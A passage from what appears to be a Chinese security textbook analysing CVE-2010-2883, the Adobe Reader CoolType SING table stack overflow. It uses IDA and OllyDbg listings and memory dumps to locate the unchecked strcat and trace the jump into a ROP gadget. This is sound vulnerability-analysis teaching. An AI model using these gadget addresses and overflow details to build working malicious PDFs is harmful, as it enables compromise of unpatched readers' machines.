00000130: 73 5d 52 c2 14 a7 82 4a 0c 0c 0c 0c bc 94 b0 83
s]R....J........
00000140: 45 a2 04 7d 13 4b 30 18 98 95 ed 9f 3e cc 50 8b
E..}.K0.....>.P.
栈溢出
我们已经知道栈溢出发生在 SING 表的处理中，于是在 IDA 中打开 CoolType.dll，
搜索字符串 "SING"：
.rdata:0819DB4C ; char aSing[]
.rdata:0819DB4C aSing db 'SING',0 ; DATA X
REF: sub_8015AD9+D2↑o
.rdata:0819DB4C ; sub_80
3DCF9+7B↑o ...
.rdata:0819DB51 align 4
对每个数据引用进行检查，发现 sub_803DCF9+7B↑o 的下方存在危险函数
strcat ：
1630
7.1.8 CVE-2010-2883 Adobe CoolType SING 表栈溢出漏洞
.text:0803DCF9 ; __unwind { // loc_8184A54
.text:0803DCF9 push ebp
.text:0803DCFA sub esp, 104h ; 分
配栈空间 104h
.text:0803DD00 lea ebp, [esp-4] ; eb
p 赋值为 esp-4
.text:0803DD04 mov eax, ___security_cookie
.text:0803DD09 xor eax, ebp
.text:0803DD0B mov [ebp+108h+var_4], eax
.text:0803DD11 push 4Ch
.text:0803DD13 mov eax, offset loc_8184A54
.text:0803DD18 call __EH_prolog3_catch
.text:0803DD1D mov eax, [ebp+108h+arg_C]
.text:0803DD23 mov edi, [ebp+108h+arg_0]
; edi 赋值为 arg_0
.text:0803DD29 mov ebx, [ebp+108h+arg_4]
.text:0803DD2F mov [ebp+108h+var_130], edi
.text:0803DD32 mov [ebp+108h+var_138], eax
.text:0803DD35 call sub_804172C
.text:0803DD3A xor esi, esi
.text:0803DD3C cmp dword ptr [edi+8], 3
.text:0803DD40 ; try {
.text:0803DD40 mov [ebp+108h+var_10C], esi
.text:0803DD43 jz loc_803DF00
.text:0803DD49 mov [ebp+108h+var_124], esi
.text:0803DD4C mov [ebp+108h+var_120], esi
.text:0803DD4F cmp dword ptr [edi+0Ch], 1
.text:0803DD4F ; } // starts at 803DD40
.text:0803DD53 ; try {
.text:0803DD53 mov byte ptr [ebp+108h+var_10
C], 1
.text:0803DD57 jnz loc_803DEA9
.text:0803DD5D push offset aName ; "name"
.text:0803DD62 push edi ; int
.text:0803DD63 lea ecx, [ebp+108h+var_124]
.text:0803DD66 mov [ebp+108h+var_119], 0
.text:0803DD6A call sub_80217D7
.text:0803DD6F cmp [ebp+108h+var_124], esi
.text:0803DD72 jnz short loc_803DDDD
1631
7.1.8 CVE-2010-2883 Adobe CoolType SING 表栈溢出漏洞
.text:0803DD74 push offset aSing ; "SING"
.text:0803DD79 push edi ; int
.text:0803DD7A lea ecx, [ebp+108h+var_12C]
; this 指针的地址，指向 SING 表入口
.text:0803DD7D call sub_8021B06
; sub_8021B06(edi, "SING")，处理 SING 表
.text:0803DD82 mov eax, [ebp+108h+var_12C]
.text:0803DD85 cmp eax, esi ; 判断是
否为空
.text:0803DD85 ; } // starts at 803DD53
.text:0803DD87 ; try {
.text:0803DD87 mov byte ptr [ebp+108h+var_10
C], 2
.text:0803DD8B jz short loc_803DDC4
; 不跳转
.text:0803DD8D mov ecx, [eax]
; SING 表开头 4 字节，即字体资源版本号（00 01 00 00）
.text:0803DD8F and ecx, 0FFFFh
; 结果为 0
.text:0803DD95 jz short loc_803DD9F
; 跳转
.text:0803DD97 cmp ecx, 100h
.text:0803DD9D jnz short loc_803DDC0
.text:0803DD9F
.text:0803DD9F loc_803DD9F: ; CODE XR
EF: sub_803DCF9+9C↑j
.text:0803DD9F add eax, 10h
; uniqueName 域
.text:0803DDA2 push eax ; Source
; 指向 uniqueName 的指针
.text:0803DDA3 lea eax, [ebp+108h+Dest]
.text:0803DDA6 push eax ; Dest
; 目的地址是固定大小的栈空间
.text:0803DDA7 mov [ebp+108h+Dest], 0
.text:0803DDAB call strcat
; 造成溢出
在调用 strcat 函数时，未对 uniqueName 的字符串长度进行检查，直接将其复制到
固定大小的栈空间，造成溢出。strcat 函数原型如下：
1632
7.1.8 CVE-2010-2883 Adobe CoolType SING 表栈溢出漏洞
char *strcat(char *dest, const char *src);
char *strncat(char *dest, const char *src, size_t n);
下面打开 OllyDbg 调试一下，先来看看函数 sub_8021B06 做了什么，在
0803DD7D 设置断点，然后在 Reader 中打开样本，程序就断了下来：
0803DD7D E8 843DFEFF call CoolType.08021B06
0803DD82 8B45 DC mov eax,dword ptr ss:[ebp-0x24]
此时的 this 指针指向 TTF 对象：
d ecx:
0012E4B4 B0 54 18 02 98 15 FC 01 00 00 00 00 00 00 00 00
瘪??........
d 021854B0:
021854B0 00 01 00 00 00 11 01 00 00 04 00 10 4F 53 2F 32
.......OS/2 
然后 F8 单步步过，eax 里是函数的返回值 0012E4B4 ，其值等于 this
指针的地址。
d 0012E4B4:
0012E4B4 38 B9 7D 04 DF 1D 00 00 00 00 00 00 00 00
00 00 8箎?..........
1633
7.1.8 CVE-2010-2883 Adobe CoolType SING 表栈溢出漏洞
下一句给 eax 赋值为一个指向 SING 表的指针，即 this 指针的内容。
d 047DB938:
047DB938 00 00 01 00 01 0E 00 01 00 00 00 00 00 00
00 3A ...........: 蘌嫭\弪??.
047DB978 25 2D 1F C3 0E 47 40 13 C9 1C 5F 86 90 AC
42 6D %-?G@?_啇珺m
047DB988 40 44 C6 D4 59 9A AC 7D 1B E1 CA 25 3E E4
B3 05 @D圃Y毈}崾%>涑
047DB998 0D 85 43 B3 D9 58 4E 7E B9 A3 6D 4C 89 29
1D FE .匔迟XN~梗mL?
047DB9A8 73 9A C4 84 6C 29 7A 5D 6D 7B 6E 1C 39 E0
1E E4 s毮刲)z]m{n9?
047DB9B8 51 7A 86 DE 7B FB 6F 04 B0 CF 3E E0 CF 4C
AB FA Qz嗈{鹢跋>嘞L
047DB9C8 71 41 CD 19 69 68 4E F6 35 A1 B5 3C 66 77
F2 45 qA?ihN?〉 fw骏
047DB9D8 71 73 01 C0 19 F4 A4 E1 D9 8A 8B C2 85 83
EA 2F qs?簸豳妺聟冴/
047DB9E8 6E ED 57 4D E6 B7 7F 88 48 BD 16 8E DC 51
9E 7E n鞼M娣圚?庈Q瀪
047DB9F8 BE 8B 09 8E 53 50 ED A9 F1 AC AE AD 01 5C
1E 11 褓.嶴P愆瘳\
047DBA08 33 06 83 44 4B 4A EC 9F 26 3A AF 0A 74 62
C5 1E 3僁KJ鞜&:?tb?
047DBA18 AE A8 58 3F F3 F1 82 F0 4D AC DA AE 10 AB
02 B9 X?篑傪M??
047DBA28 E2 03 EF F6 76 B4 EF 35 4D 8D 45 3B F4 FE
1634
7.1.8 CVE-2010-2883 Adobe CoolType SING 表栈溢出漏洞
9A D0 ?秭v达5M岴;酤毵
047DBA38 58 AE 97 E5 D7 D8 EF 62 2F 4E 30 D6 B8 B4
A2 73 X畻遄仫b/N0指储s
047DBA48 E3 B7 84 6A A9 41 CE 16 CC FB 8B 1D 43 1B
B5 DB 惴刯〢?帖?C帝
047DBA58 1D 60 EC BE C1 47 BA 2A 03 DD 3A C4 E1 93
74 1D `炀罣??尼搕
047DBA68 66 41 B0 85 B8 2A 5E DE 39 C9 5D 97 ED 1B
82 65 fA皡?^?蒥楉伡
047DBA78 C6 08 8A 4A E5 20 41 0C 26 0A 03 AA 46 C5
36 C9 ?奂?A.&.徇?
047DBA88 CB 76 1D C4 56 BD 76 A3 34 F7 2B 79 1F 6D
51 2C 藇腣絭??ymQ,
047DBA98 9F 79 21 5E A8 94 1B 4A 05 BF B3 7C BC B2
FD 99 焬!^〝J砍|疾龣
047DBAA8 E5 B3 08 D2 BC 86 25 BB C1 F8 DE F3 4A C8
1E 82 宄壹?涣骧?
047DBAB8 25 12 18 C2 A9 F1 E6 36 92 94 01 29 98 A3
F5 A3 %漏矜6挃)槪酰
047DBAC8 25 4B 02 0D 17 F2 87 B1 99 A5 8F 6F AA 81
21 64 %K.蓦睓o𪺷!d
047DBAD8 B8 57 11 6D CF 88 FC B8 22 B9 2B 58 66 CF
D2 8B 竁m蠄"?Xf弦
047DBAE8 F8 12 D6 82 CC B3 5E 28 B4 85 51 54 23 2B
74 21 ?謧坛^(磪QT#+t!
047DBAF8 FC 6D 97 08 96 0D BE 76 F5 46 04 72 A6 7B
CA 29 黰??绿鮂r?
047DBB08 07 C6 41 55 B2 48 D9 F5 C7 E3 0C 35 1E DA
06 BF 舻U睭脔倾.5?
047DBB18 D3 62 D4 D3 D4 A8 D3 AF A1 17 09 13 E1 5B
18 FD 觔杂渊盈?.醄
047DBB28 ED 04 43 AC 1C 6F A6 1E 02 64 49 D1 5F 5E
54 75 ?C?o?dI裚^Tu
047DBB38 A7 24 35 67 FF CC E6 E0 38 CB 80 4A 44 B6
49 EA ?5g 替?藔JD禝 
所以这个函数的作用已经清楚了，通过传入的 tag 字符串，在 this
指针指向的 TTF 对象里找到对应的表目录项，使用表地址重置 this
指针。
接下来就是 strcat 函数了。
0803DD9F 83C0 10 add eax,0x10
0803DDA2 50 push eax
0803DDA3 8D45 00 lea eax,dword ptr ss:[ebp]
0803DDA6 50 push eax
0803DDA7 C645 00 00 mov byte ptr ss:[ebp],0x0
0803DDAB E8 483D1300 call 
根据上面的 SING 表可以看到， uniqueName 原本只应该有最多
0x1c 个字节，但 strcat 根据 "\x00" 来作为字符串的结束，将
导致复制 0x22d 个字节到栈上，造成溢出。
ROP
我们对复制到栈上的这段数据（ 0012E4D8 ~ 0012E714 ）设置内存访问
断点。并开启 run trace 进行函数跟踪。
1636
7.1.8 CVE-2010-2883 Adobe CoolType SING 表栈溢出漏洞
继续运行，然后我们记录下函数调用：
CoolType.08016BDE --> CoolType.0801BB21 --> CoolType.0808
B116 --> icucnv36.4A80CB38
0803DEAC 50 push eax
0803DEAD 53 push ebx
0803DEAE 57 push edi
0803DEAF E8 2A8DFDFF call CoolType.08016BDE
CoolType.08016BDE ：
08016C46 6A 01 push 0x1
08016C48 53 push ebx
08016C49 53 push ebx
08016C4A 8D45 EC lea eax,dword ptr ss:[ebp-0x1
4]
08016C4D 50 push eax
08016C4E 8D45 D0 lea eax,dword ptr ss:[ebp-0x3
0]
08016C51 50 push eax
08016C52 57 push edi
08016C53 FF75 E8 push dword ptr ss:[ebp-0x18]
08016C56 E8 C64E0000 call CoolType.0801BB21
CoolType.0801BB21 ：
1637
7.1.8 CVE-2010-2883 Adobe CoolType SING 表栈溢出漏洞
0801BB24 FF75 20 push dword ptr ss:[ebp+0x20]
0801BB27 8B4D 08 mov ecx,dword ptr ss:[ebp+0x8
]
0801BB2A FF75 1C push dword ptr ss:[ebp+0x1C]
0801BB2D 8B01 mov eax,dword ptr ds:[ecx]
; CoolType.081A601C
0801BB2F FF75 18 push dword ptr ss:[ebp+0x18]
0801BB32 FF05 A0A62308 inc dword ptr ds:[0x823A6A0]
0801BB38 FF75 14 push dword ptr ss:[ebp+0x14]
0801BB3B FF75 10 push dword ptr ss:[ebp+0x10]
0801BB3E FF75 0C push dword ptr ss:[ebp+0xC]
0801BB41 FF10 call dword ptr ds:[eax]
; CoolType.0808B116
最终来到 CoolType.0808B116 里的关键点：
1638
7.1.8 CVE-2010-2883 Adobe CoolType SING 表栈溢出漏洞
0808B11D 8B7D 08 mov edi,dword ptr ss:[ebp+0x8
]
...
0808B2E3 8B47 3C mov eax,dword ptr ds:[edi+0x3
C] ; eax = ds:[edi+0x3C]
0808B2E6 3BC3 cmp eax,ebx
0808B2E8 8986 F4020000 mov dword ptr ds:[esi+0x2F4],
eax
0808B2EE 899E F8020000 mov dword ptr ds:[esi+0x2F8],
ebx
0808B2F4 895D FC mov dword ptr ss:[ebp-0x4],eb
x
0808B2F7 75 07 jnz short CoolType.0808B300
0808B2F9 32C0 xor al,al
0808B2FB E9 94020000 jmp CoolType.0808B594
0808B300 8D4D FC lea ecx,dword ptr ss:[ebp-0x4
]
0808B303 51 push ecx
0808B304 53 push ebx
0808B305 6A 03 push 0x3
0808B307 50 push eax
0808B308 FF10 call dword ptr ds:[eax]
; icucnv36.4A80CB38
通过最后的 call 指令，程序跳转到了 ROP 链。回忆一下
uniqueName 域从 0012E4D8 开始：
1639
7.1.8 CVE-2010-2883 Adobe CoolType SING 表栈溢出漏洞
4A80CB38 81C5 94070000 add ebp,0x794 ; ebp = 0012E
4DC
4A80CB3E C9 leave ; esp = 0012E
4E0, ebp = C2525D73
4A80CB3F C3 retn ; esp = 0012E
4E4, eip = 4A82A714